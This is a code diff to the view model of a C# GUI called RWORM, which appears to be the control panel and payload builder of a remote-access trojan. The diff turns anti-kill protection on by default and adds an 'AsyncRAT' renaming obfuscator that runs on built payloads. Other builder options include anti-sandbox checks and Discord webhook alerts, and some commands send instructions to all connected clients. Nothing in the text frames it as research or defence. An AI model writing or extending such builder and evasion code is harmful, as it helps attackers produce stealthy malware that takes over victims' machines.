@@ -56,7 +56,8 @@ namespace RWORM.GUI.ViewModels
         }
 
         // Surveillance & Evasion builder options
-        private bool   _buildAntiKill;
+        private bool   _buildAntiKill = true;
+        private bool   _buildObfuscator = false;
         private bool   _buildAntiSandbox;
         private bool   _buildDiscordAlert;
         private string _buildDiscordWebhook = "";
@@ -122,6 +123,7 @@ namespace RWORM.GUI.ViewModels
         public string BuildTaskUrl          { get => _buildTaskUrl;          set { _buildTaskUrl          = value; OnPropertyChanged(); } }
 
         public bool   BuildAntiKill         { get => _buildAntiKill;         set { _buildAntiKill         = value; OnPropertyChanged(); } }
+        public bool   BuildObfuscator       { get => _buildObfuscator;       set { _buildObfuscator       = value; OnPropertyChanged(); } }
         public bool   BuildAntiSandbox      { get => _buildAntiSandbox;      set { _buildAntiSandbox      = value; OnPropertyChanged(); } }
         public bool   BuildDiscordAlert     { get => _buildDiscordAlert;     set { _buildDiscordAlert     = value; OnPropertyChanged(); } }
         public string BuildDiscordWebhook   { get => _buildDiscordWebhook;   set { _buildDiscordWebhook   = value; OnPropertyChanged(); } }
@@ -274,8 +276,8 @@ namespace RWORM.GUI.ViewModels
             ClientUpdateCommand       = new RelayCommand(p => PromptUpdate(p as ClientModel));
             WatchdogStopCommand       = new RelayCommand(p => ExecuteWatchdogControl(p as ClientModel, false));
             WatchdogStartCommand      = new RelayCommand(p => ExecuteWatchdogControl(p as ClientModel, true));
-            SendToAllCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync());
-            SendQuickCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync());
+            SendToAllCommand          = new RelayCommand(_ => ExecuteQuickCommand());
+            SendQuickCommand          = new RelayCommand(_ => ExecuteQuickCommand());
 
             // Tasks
             TestTaskDiscordWebhookCommand = new RelayCommand(async _ => await TestTaskDiscordWebhookAsync());
@@ -433,7 +435,7 @@ namespace RWORM.GUI.ViewModels
             return new List<ClientModel>();
         }
 
-        private async Task ExecuteQuickCommandAsync()
+        private void ExecuteQuickCommand()
         {
             var targets = ResolveTargets(null);
             if (targets.Count == 0 && Clients.Count > 0) targets = Clients.ToList();
@@ -781,7 +783,7 @@ namespace RWORM.GUI.ViewModels
 
         private void PromptMultiSend()
         {
-            _ = ExecuteQuickCommandAsync();
+            ExecuteQuickCommand();
         }
 
         // ── Tasks ─────────────────────────────────────────────────────────────
@@ -1488,8 +1490,22 @@ namespace RWORM.GUI.ViewModels
                 if (System.IO.File.Exists(src))
                 {
                     System.IO.File.Copy(src, dlg.FileName, true);
+
+                    if (BuildObfuscator)
+                    {
+                        try
+                        {
+                            StatusMessage = "Applying AsyncRAT Obfuscator...";
+                            RWORM.GUI.RenamingObfuscation.Obfuscator.ObfuscateAssembly(dlg.FileName);
+                        }
+                        catch (Exception obfEx)
+                        {
+                            System.Windows.MessageBox.Show($"Warning: Obfuscation failed: {obfEx.Message}\nPayload built without obfuscation.", "Obfuscation Warning");
+                        }
+                    }
+
                     StatusMessage = "Build complete!";
-                    System.Windows.MessageBox.Show($"Built → {dlg.FileName}", "Build Complete");
+                    System.Windows.MessageBox.Show($"Built → {dlg.FileName}" + (BuildObfuscator ? "\n(Obfuscated with AsyncRAT dnlib renamer)" : ""), "Build Complete");
                 }
                 else
                 {
